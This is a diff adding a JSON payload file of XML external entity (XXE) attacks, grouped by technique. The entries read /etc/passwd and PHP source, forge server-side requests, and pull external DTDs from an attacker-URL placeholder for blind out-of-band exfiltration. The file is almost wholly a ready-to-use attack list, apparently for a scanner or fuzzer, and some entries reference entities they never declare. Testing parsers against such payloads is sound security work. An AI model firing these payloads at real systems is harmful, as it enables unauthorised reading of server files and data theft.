@@ -1,0 +1,69 @@
+{
+    "classic": [
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo></foo>",
+        "<!DOCTYPE root [<!ENTITY % ext SYSTEM \"{{ATTACKER_URL}}//evil.dtd\">%ext;]>"
+    ],
+    "blind": [
+        "<?xml version=\"1.0\" ?><!DOCTYPE test [ <!ENTITY % xxe SYSTEM \"{{ATTACKER_URL}}/xxe.dtd\"> %xxe; ]><test></test>",
+        "<?xml version=\"1.0\" ?><!DOCTYPE test [ <!ENTITY &#x25; file SYSTEM \"{{ATTACKER_URL}}/xxe-data.txt\"> %xxe; ]><test></test>"
+    ],
+    "parameter": [
+        "<?xml version=\"1.0\" ?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM \"{{ATTACKER_URL}}/xxe.dtd\"> %xxe;]><foo></foo>",
+        "<?xml version=\"1.0\" ?><!DOCTYPE test [ <!ENTITY % data SYSTEM \"{{ATTACKER_URL}}/xxe-data.txt\"> %data; ]><test></test>"
+    ],
+    "soap": [
+        "<methodCall><methodName>&xxe;</methodName></methodCall>",
+        "<methodCall><methodName>myMethod</methodName><params><param><value>&xxe;</value></param></params></methodCall>"
+    ],
+    "ssrf": [
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo></foo>",
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"{{ATTACKER_URL}}/xxe-ssrf\">]><foo></foo>"
+    ],
+    "file_upload": [
+        "<?xml version=\"1.0\" ?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> %xxe;]><foo></foo>"
+    ],
+    "remote_code_execution": [
+        "<?xml version=\"1.0\" ?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM \"{{ATTACKER_URL}}/rce.dtd\"> %xxe;]><foo></foo>"
+    ],
+    "xss_via_xxe": [
+        "<?xml version=\"1.0\" ?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe '<script>alert(\"XXE via XSS\")</script>'> ]><foo>&xxe;</foo>"
+    ],
+    "json_content_manipulation": [
+        "{\"data\": \"<?xml version=\\\"1.0\\\" encoding=\\\"ISO-8859-1\\\"?><root></root>\"}",
+        "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo></foo>"
+    ],
+    "xinclude_attack": [
+        "<?xml version=\"1.0\" ?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo><xi:include href=\"file:///etc/passwd\" parse=\"xml\"/></foo>"
+    ],
+    "timing_attack": [
+        "<?xml version=\"1.0\" ?><!DOCTYPE root [ <!ENTITY % data SYSTEM \"{{ATTACKER_URL}}/xxe-timing.dtd\">%data; ]><root></root>"
+    ],
+    "image_metadata": [
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"image.jpg\"> ]><foo>&xxe;</foo>"
+    ],
+    "xml_namespaces": [
+        "<?xml version=\"1.0\"?><foo:bar xmlns:foo=\"{{ATTACKER_URL}}/\"><foo:payload>&xxe;</foo:payload></foo:bar>"
+    ],
+    "user_agent_header": [
+        "<?xml version=\"1.0\"?><!DOCTYPE root [ <!ENTITY % ext SYSTEM \"{{ATTACKER_URL}}/xxe-ua\"> %ext; ]><root></root>"
+    ],
+    "advanced_oob_data_exfiltration": [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY % payload SYSTEM \"{{ATTACKER_URL}}/xxe-advanced.dtd\"> %payload; ]><foo></foo>"
+    ],
+    "polyglot_xxe_sql": [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>' || '&xxe;' || '</foo>"
+    ],
+    "polyglot_xxe_js": [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo><script>alert('&xxe;');</script></foo>"
+    ],
+    "recursive_xxe": [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe \"xxe\"><!ENTITY rec SYSTEM '{{TARGET_URL}}/?xxe=&xxe;'>]><foo>&rec;</foo>"
+    ],
+    "adaptive_xxe": [
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo><![CDATA[<&xxe;]>]]></foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"{{TARGET_URL}}/conditional.dtd\"><!ENTITY % cond '<![ %dtd;[<&xxe;]>]]>'>]><foo>%cond;</foo>"
+    ]
+}
+
+
+
